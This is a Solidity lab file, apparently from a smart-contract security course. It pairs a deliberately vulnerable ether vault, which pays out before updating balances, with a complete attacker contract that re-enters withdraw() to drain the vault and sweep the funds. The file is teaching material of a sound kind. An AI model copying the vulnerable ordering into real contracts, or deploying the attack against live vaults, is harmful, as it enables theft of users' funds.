// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
//  LAB — Smart Contract Security · Reentrancy (the vulnerable version)
//
//  This file is COMPLETE and meant to be RUN, not completed. Deploy it in the
//  Remix JavaScript VM and watch a whole vault get drained in ONE transaction.
//
//  The bug is on a single line: `EtherStore.withdraw` sends ether BEFORE it
//  updates `balances`. The recipient receives control (its `receive()` runs)
//  while the contract is still in an inconsistent state — `balances[attacker]`
//  has not been zeroed yet — so the attacker simply calls `withdraw` again,
//  and again, looping until the vault is empty.
//
//  This is the exact class of bug behind The DAO (2016). See the fixed version
//  in 02-SafeEtherStore.sol for the two standard defences:
//    • Checks-Effects-Interactions (update state BEFORE the external call)
//    • a reentrancy lock (mutex)
// ─────────────────────────────────────────────────────────────────────────────

/// @title A naive ether vault — DO NOT USE. Intentionally vulnerable.
contract EtherStore {
    mapping(address => uint256) public balances;

    /// @notice Deposit ether; the vault credits your internal balance.
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice Withdraw your whole balance.
    /// @dev    VULNERABLE ORDERING. The external call happens FIRST; the
    ///         bookkeeping update happens AFTER. During the call the attacker
    ///         re-enters this same function while `balances[msg.sender]` is
    ///         still non-zero.
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "nothing to withdraw");

        // INTERACTION (external call) — hands control to msg.sender.
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "transfer failed");

        // EFFECT — happens too late: the attacker has already re-entered.
        balances[msg.sender] = 0;
    }

    /// @notice Total ether currently held by the vault.
    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @title The attacker contract.
/// @notice `receive()` is the re-entry hook: every time the vault pays this
///         contract, `receive()` fires and calls `withdraw` again.
contract Attack {
    EtherStore public immutable store;

    constructor(address storeAddress) {
        store = EtherStore(storeAddress);
    }

    /// @notice Seed the attack with 1 ETH, then trigger the drain.
    /// @dev    Send VALUE = 1 ether when calling this in Remix.
    function attack() external payable {
        require(msg.value >= 1 ether, "seed the attack with >= 1 ETH");
        store.deposit{value: 1 ether}();
        store.withdraw(); // first (legitimate) withdrawal — kicks off the loop
    }

    /// @dev The re-entry point. While the vault still holds at least the amount
    ///      it just tried to pay us, dive back in.
    receive() external payable {
        if (address(store).balance >= 1 ether) {
            store.withdraw();
        }
    }

    /// @notice Sweep the stolen ether from this contract to the attacker (you).
    function collect() external {
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "collect failed");
    }

    /// @notice Convenience getter for the loot held by this contract.
    function loot() external view returns (uint256) {
        return address(this).balance;
    }
}
